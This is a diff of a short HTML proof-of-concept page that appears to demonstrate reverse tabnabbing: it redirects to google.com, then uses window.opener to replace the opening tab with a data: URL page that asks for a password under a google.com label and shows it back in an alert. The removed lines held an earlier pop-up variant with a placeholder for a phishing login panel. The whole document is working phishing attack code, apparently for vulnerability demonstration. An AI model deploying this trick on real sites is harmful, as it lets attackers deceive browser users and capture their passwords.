@@ -1,8 +1,15 @@
+<html>
+<body>
 <script>
-    function spoof() {
-        nWindow = window.open('https:/www.google.com');
-        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
-}
+location='https://www.google.com';
+function go(){
+if(window.opener){
+window.opener.location = 'data:text/html,<title>test</title><script>'+
+'pass = prompt("https://google.com \nType your password:\n");'+
+'alert("Your Password is: "+pass);'+
+'<\/script>';
+}}
+go();
 </script>
-<input type="button" onclick="spoof()" value="PoC!">
-The page is being hosted in my server
+</body>
+</html>
